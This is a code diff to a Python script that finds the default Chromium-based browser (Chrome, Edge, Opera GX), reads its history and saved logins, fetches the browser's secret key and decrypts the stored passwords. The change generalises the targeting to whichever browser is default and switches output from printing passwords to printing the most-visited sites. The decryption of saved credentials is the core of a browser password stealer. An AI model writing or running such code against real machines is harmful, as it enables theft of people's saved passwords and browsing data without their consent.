@@ -1,14 +1,16 @@
 from chromiumBrowser import Chromium
 import dataComprehention
+import getBrowser
 
+chromiumParams = getBrowser.getChromiumParams()
+defaultBrowser = Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])
 
-#googleChrome = Chromium("enviromentPath", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
-#googleChrome = Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
+#googleChrome = Chromium("LOCALAPPDATA", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
+#microsoftEdge = Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
+#operaGX = Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")
 
-googleChrome = Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")
-
-history = googleChrome.getHistory()
-loginData = googleChrome.getLoginData()
+history = defaultBrowser.getHistory()
+loginData = defaultBrowser.getLoginData()
 
 for login in loginData:
     url = login["origin_url"]
@@ -16,10 +18,10 @@ for login in loginData:
     ciphertext = login["password_value"]
 
     if url == "" or username == "": continue
-    secretKey = googleChrome.getSecretKey()
-    password = googleChrome.decryptPassword(ciphertext, secretKey)
+    secretKey = defaultBrowser.getSecretKey()
+    password = defaultBrowser.decryptPassword(ciphertext, secretKey)
 
-    print(password)
+    #print(password)
 
 topWebsites = dataComprehention.topWebsitesVisited(history)
-#print(topWebsites)
+print(topWebsites)
